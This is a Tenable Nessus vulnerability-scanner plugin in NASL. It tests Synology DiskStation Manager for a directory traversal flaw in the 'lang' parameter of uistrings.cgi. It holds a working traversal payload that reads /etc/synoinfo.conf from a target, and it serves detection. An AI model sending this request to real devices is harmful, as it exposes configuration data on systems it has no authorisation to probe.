#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(72347);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_bugtraq_id(62310);
  script_xref(name:"EDB-ID", value:"28243");

  script_name(english:"Synology DiskStation Manager uistrings.cgi lang Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis", value:
"The remote Synology DiskStation Manager is affected by a directory
traversal vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The Synology DiskStation Manager installed on the remote host is
affected by a directory traversal vulnerability.  By sending a large,
padded file path to the 'lang' parameter of the 'uistrings.cgi'
script, an overflow will occur within the snprintf function used to
prevent such attacks.  A remote, unauthenticated attacker could
leverage this vulnerability to view lines with an equal sign, notably
key/value pairs, in files.

Note that the affected uistrings.cgi script is located in both the
'/scripts/' and '/webfm/webUI/' web directories."
  );
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2013/Sep/53");
  script_set_attribute(attribute:"solution", value:"Upgrade to 4.3-3776 Update 2.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"directory traversal");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/09/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/02/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:synology:diskstation_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("synology_diskstation_manager_detect.nbin");
  script_require_keys("www/synology_dsm");
  script_require_ports("Services/www", 5000, 5001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:5000, embedded:TRUE);

install = get_install_from_kb(appname:"synology_dsm", port:port, exit_on_fail:TRUE);

app = "Synology DiskStation Manager (DSM)";
dir = "scripts";
install_loc = build_url(port:port, qs:dir + "/");

# Verify the file can be retrieved
file = "/etc/synoinfo.conf";

url = "uistrings.cgi?lang=.////////////////////////////////////////////////////////////////////////////////////////../../../../.." + file;

res = http_send_recv3(
    method    : "GET",
    item      : install_loc + url,
    port      : port,
    exit_on_fail : TRUE
);

if (("['company_title']=" >< res[2]) && ("['admin_port']" >< res[2]))
{
  report = NULL;
  attach_file = NULL;
  output = NULL;
  req = install_loc + url;
  request = NULL;

  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
      '\n' + 'a Synology configuration file (\'' + file + '\')' +
      '\n' + 'using the following request :' +
      '\n' +
      '\n' + req +
      '\n' +
      '\n' + 'Note that this URL results in the key/value contents of the' +
      '\n' + 'configuration file being shown.' +
      '\n';

    if (report_verbosity > 1)
    {
      output = data_protection::sanitize_user_full_redaction(output:res[2]);
      attach_file = file;
      request = make_list(req);
    }
  }

  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_WARNING,
                     request:request,
                     file:attach_file,
                     output:output);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_loc);
